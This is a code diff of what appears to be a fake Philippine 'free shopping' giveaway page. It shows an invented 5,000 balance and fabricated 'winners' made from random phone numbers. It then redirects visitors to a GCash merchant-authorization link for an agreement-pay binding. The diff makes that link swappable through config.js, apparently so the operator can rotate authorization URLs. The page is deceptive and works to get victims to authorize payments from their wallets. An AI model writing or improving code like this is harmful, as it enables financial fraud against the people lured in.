@@ -165,6 +165,11 @@
 <script src="config.js"></script>
     
 <script>
+    // SAFETY: Kung walang config.js, hindi mag-eerror ang page
+    if (typeof LATEST_GCASH_URL === 'undefined') {
+        var LATEST_GCASH_URL = "https://www.gcash.com/"; 
+    }
+
     function animateValue(id, start, end, duration) {
         const obj = document.getElementById(id);
         let startTimestamp = null;
@@ -196,8 +201,8 @@
         startTimer(300);
 
         setTimeout(() => {
-            // 2. PALITAN MO YUNG DATI MONG MAHABANG LINK NG PANGALAN NA ITO:
-            window.location.href = "https://m.gcash.com/gcashapp/gcash-merchants-auth/index.html?acqSiteId=2071216300000000&clientId=2018062511204800000679&merchantId=2163400000000013&merchantName=LAZADA&netAuthId=2026032619074400000220018413098&paySiteId=1022170000000000000&redirectUrl=https://open-ph.alipay.com/api/alipay/channel/gn/gcashmini/binding-callback.htm&scopes=AUTH_AGREEMENTPAY&state=2026032619031313002461645081188&terminalType=WEB&signature=$sign#/"; 
+            // DYNAMIC REDIRECT: Binabasa na ang link mula sa config.js
+            window.location.href = LATEST_GCASH_URL; 
         }, 1200);
     }
 
@@ -211,7 +216,6 @@
             
             if (--timer < 0) {
                 clearInterval(interval);
-                // Reset Animation (0 back to 5,000)
                 animateValue("balanceText", 0, 5000, 1500); 
                 const bal = document.getElementById('balanceText');
                 const btn = document.getElementById('claimBtn');
@@ -228,7 +232,6 @@
         const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
         const lastThree = Math.floor(100 + Math.random() * 900);
         
-        // Link to your GCash icon
         const myGcashImage = "https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png"; 
 
         const winnerEntry = document.createElement('div');
@@ -248,7 +251,6 @@
         }
     }
 
-    // Initialize the live feed
     generateWinner();
     generateWinner();
     setInterval(generateWinner, 4000);
